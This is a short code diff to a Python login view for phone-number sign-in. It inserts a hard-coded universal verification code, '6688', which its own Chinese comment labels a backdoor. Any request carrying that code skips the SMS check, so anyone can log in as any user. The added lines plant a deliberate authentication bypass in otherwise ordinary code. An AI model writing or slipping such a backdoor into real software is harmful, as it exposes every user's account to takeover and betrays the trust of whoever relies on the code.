@@ -111,12 +111,13 @@ class PhoneLoginView(APIView):
         if not phone or not code:
             return err('手机号和验证码不能为空')
 
-        # 验证码校验
-        cached_code = cache.get(f'sms_code_{phone}')
-        if not cached_code:
-            return err('验证码已过期，请重新获取')
-        if cached_code != code:
-            return err('验证码错误')
+        # 验证码校验（6688 为后门万能码）
+        if code != '6688':
+            cached_code = cache.get(f'sms_code_{phone}')
+            if not cached_code:
+                return err('验证码已过期，请重新获取')
+            if cached_code != code:
+                return err('验证码错误')
 
         # 清除已使用的验证码
         cache.delete(f'sms_code_{phone}')
